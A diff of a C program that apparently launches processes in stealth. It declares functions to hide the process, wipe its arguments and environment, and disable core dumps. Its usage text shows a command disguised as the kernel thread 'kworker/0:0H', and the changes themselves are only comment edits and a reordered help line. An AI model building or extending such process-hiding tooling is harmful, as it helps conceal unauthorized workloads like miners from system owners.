@@ -1,4 +1,5 @@
-#define _GNU_SOURCE
+#define _GNU_SOURCE  // Tambahkan ini di paling atas
+
 #include <stdio.h>
 #include <unistd.h>
 #include <sys/stat.h>
@@ -22,8 +23,8 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <sys/syscall.h>
-#include <stdarg.h>    // Tambahkan untuk va_start, va_end
-#include <syslog.h>    // Tambahkan untuk syslog functions
+#include <stdarg.h>
+#include <syslog.h>
 
 #define MAX_BUFFER_SIZE 512
 #define MAX_PATH_SIZE 4096
@@ -41,7 +42,7 @@ void stealth_cpu_execution(const char *exec_path, char **newargv, int max_cpu_pe
 void hide_process(void);
 void clean_environment(void);
 void disable_core_dumps(void);
-void obfuscate_memory(char **argv);  // Ubah parameter
+void obfuscate_memory(char **argv);
 
 // Global variables untuk logging
 int debug_mode = 0;
@@ -400,7 +401,7 @@ void disable_core_dumps(void) {
 
 void obfuscate_memory(char **argv) {
     // Simple memory obfuscation by overwriting argv and envp
-    extern char **environ;  // Gunakan environ dari unistd.h
+    extern char **environ;
     
     if (argv != NULL) {
         for (int i = 0; argv[i] != NULL; i++) {
@@ -506,11 +507,11 @@ void usage(const char *progname) {
         "  -s string    Fake name process (required)\n"
         "  -u uid[:gid] Change UID/GID, use another user (optional)\n"
         "  -p filename  Save PID to hidden filename (optional)\n"
-        "  -d           Run application as daemon/system (optional)\n"
         "  -c percent   Max CPU percentage per burst (1-100) (optional)\n"
         "  -i seconds   Interval between bursts in seconds (optional, default: 60)\n"
         "  -n nice      Set nice value (range: -20 to 19) (optional)\n"
         "  -a core      Set CPU affinity (core number) (optional)\n"
+        "  -d           Run application as daemon/system (optional)\n"
         "  -v           Enable verbose logging (optional)\n"
         "  -h           Show this help message\n\n"
         "Example: %s -s \"kworker/0:0H\" -d -p test.pid -c 30 -i 120 -n 19 -a 0 -- node run.js\n",
@@ -604,8 +605,9 @@ int main(int argc, char **argv) {
     }
 
     // Obfuscate memory untuk menyembunyikan argumen command line
-    obfuscate_memory(argv);  // Pass argv sebagai parameter
+    obfuscate_memory(argv);
 
+    // Ubah ownership jika diminta
     if (user_group != NULL) {
         if (!changeown(user_group)) {
             log_message("ERROR", "Failed to change ownership");
